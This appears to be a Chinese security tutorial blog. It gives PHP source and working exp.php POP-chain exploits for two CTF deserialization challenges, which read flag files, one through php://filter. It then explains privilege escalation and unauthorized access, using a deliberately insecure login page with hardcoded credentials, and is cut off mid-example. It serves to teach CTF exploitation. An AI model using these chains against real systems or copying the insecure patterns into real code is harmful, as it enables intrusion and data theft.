<h3 id="反序列化漏洞POP链"><a href="#反序列化漏洞POP链" class="headerlink" title="反序列化漏洞POP链"></a>反序列化漏洞POP链</h3><h4 id="构造POP链题目1"><a href="#构造POP链题目1" class="headerlink" title="构造POP链题目1"></a>构造POP链题目1</h4><p><img src="/2023/012220963/215.PNG" alt=" "></p>
<p><strong>pop1.php</strong></p>
<p>获取位于目标主机 D:\flag.txt 中的flag</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">//hint is in hint.php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Start</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$flag</span><span class="token operator">=</span><span class="token string single-quoted-string">'syst3m("type D:\flag.txt");'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"I think you need /etc/hint . Before this you need to see the source code"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">_sayhello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token string single-quoted-string">'ok'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hi"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">_sayhello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$cc</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"give you flag : "</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">flag</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Info</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$phonenumber</span><span class="token operator">=</span><span class="token number">123123</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$promise</span><span class="token operator">=</span><span class="token string single-quoted-string">'I do'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">promise</span><span class="token operator">=</span><span class="token string single-quoted-string">'I will not !!!!'</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">promise</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token operator">-></span><span class="token property">ffiillee</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ffiilleennaammee'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Room</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string single-quoted-string">'/flag'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$sth_to_set</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">Get_hint</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$hint</span><span class="token operator">=</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$hint</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">Get_hint</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$content</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hello'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hello'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$hi</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'pop1.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>exp.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Start</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Info</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$phonenumber</span><span class="token operator">=</span><span class="token number">123123</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$promise</span><span class="token operator">=</span><span class="token string single-quoted-string">'I do'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Room</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$sth_to_set</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$start</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$info</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$room</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Room</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$room</span><span class="token operator">-></span><span class="token property">filename</span><span class="token operator">=</span><span class="token string double-quoted-string">"D:\\flag.txt"</span><span class="token punctuation">;</span><span class="token comment">//路径要注意</span>
<span class="token variable">$room</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">=</span><span class="token variable">$room</span><span class="token punctuation">;</span>
<span class="token variable">$info</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$room</span><span class="token punctuation">;</span>
<span class="token variable">$start</span><span class="token operator">-></span><span class="token property">name</span><span class="token operator">=</span><span class="token variable">$info</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$start</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h4 id="构造POP链题目2"><a href="#构造POP链题目2" class="headerlink" title="构造POP链题目2"></a>构造POP链题目2</h4><p><strong>BUUOJ</strong>：**<a target="_blank" rel="noopener" href="https://buuoj.cn/">https://buuoj.cn/</a>     **题目：[MRCTF2020]Ezpop</p>
<p><img src="/2023/012220963/216.PNG" alt=" "></p>
<p>pop2.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">Welcome to index.php
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">//flag is in flag.php</span>
<span class="token comment">//WTF IS THIS?</span>
<span class="token comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span>
<span class="token comment">//And Crack It!</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Modifier</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">append</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Welcome to '</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/gopher|http|file|ftp|https|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker"</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">p</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>exp.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//flag is in flag.php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Modifier</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token operator">=</span><span class="token string double-quoted-string">"php://filter/read=convert.base64-encode/resource=flag.php"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$modifier</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Modifier</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$show</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$test</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$test</span><span class="token operator">-></span><span class="token property">p</span><span class="token operator">=</span><span class="token variable">$modifier</span><span class="token punctuation">;</span>
<span class="token variable">$show</span><span class="token operator">-></span><span class="token property">str</span><span class="token operator">=</span><span class="token variable">$test</span><span class="token punctuation">;</span>
<span class="token variable">$show</span><span class="token operator">-></span><span class="token property">source</span><span class="token operator">=</span><span class="token variable">$show</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$show</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h4 id="进阶CTF练习题"><a href="#进阶CTF练习题" class="headerlink" title="进阶CTF练习题"></a>进阶CTF练习题</h4><p><strong>BUUOJ</strong>：**<a target="_blank" rel="noopener" href="https://buuoj.cn/">https://buuoj.cn/</a> **题目：[SWPUCTF 2018]SimplePHP</p>
<p><strong>WP</strong>：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45669205/article/details/116097410">https://blog.csdn.net/weixin_45669205/article/details/116097410</a></p>
<h2 id="逻辑漏洞-越权及未授权访问漏洞"><a href="#逻辑漏洞-越权及未授权访问漏洞" class="headerlink" title="逻辑漏洞-越权及未授权访问漏洞"></a>逻辑漏洞-越权及未授权访问漏洞</h2><h3 id="越权漏洞介绍"><a href="#越权漏洞介绍" class="headerlink" title="越权漏洞介绍"></a>越权漏洞介绍</h3><h4 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h4><p>普通用户A可以利用水平越权漏洞访问用户B的内容，实现同级别用户的跨越。</p>
<p>通过修改或更换某个ID或者其他的身份标识，使用户A访问（查看、修改、删除）用户B的数据。</p>
<h4 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h4><p>普通用户A可以通过垂直越权漏洞，访问管理员用户的内容</p>
<p>通过修改或更换某个ID或者其他的身份标识，使低权限用户A执行（查看、修改、删除）管理员才能访</p>
<p>问的操作。</p>
<p>图解：</p>
<p><img src="/2023/012220963/180.PNG" alt=" "></p>
<h4 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h4><p>未授权访问漏洞是指一些需要安全配置或权限认证的地址、授权页面存在缺陷，使得其他用户可以直接</p>
<p>访问该地址，导致重要权限可被操作、数据库或网站目录等敏感信息泄露。</p>
<p><strong>案例:</strong></p>
<p><strong>login.php</strong></p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>IE=edge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>管理员登录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>请输入账号<span class="token punctuation">"</span></span>
<span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>admin<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pass<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>请输入密码<span class="token punctuation">"</span></span>
<span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1234<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
<span class="token prolog">&lt;?php
$user = $_POST['user'];
$pass = $_POST['pass'];
if($user == '' &amp;&amp; $pass == "")&#123;
    exit(0);
&#125;
if($user == 'admin' &amp;&amp; $pass == "1234")&#123;
    Header("Location:admin.php");
&#125; else&#123;
    echo '&lt;script>alert("用户名或密码错误！")&lt;/script>';
&#125;
?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>admin.php</strong></p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
